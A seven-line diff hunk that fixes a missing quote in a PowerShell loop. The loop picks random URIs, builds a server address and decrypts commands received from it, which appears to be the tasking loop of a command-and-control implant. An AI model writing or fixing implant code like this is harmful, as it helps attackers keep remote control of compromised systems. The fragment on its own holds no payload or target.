@@ -1162,7 +1162,7 @@ while($true)
 
      while($ReadCommand) {
         $RandomURI = Get-Random $URLS
-        $Server = "$ServerClean/$RandomURI$URI
+        $Server = "$ServerClean/$RandomURI$URI"
         $ReadCommandClear = Decrypt-String $key $ReadCommand
         $error.clear()
         if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
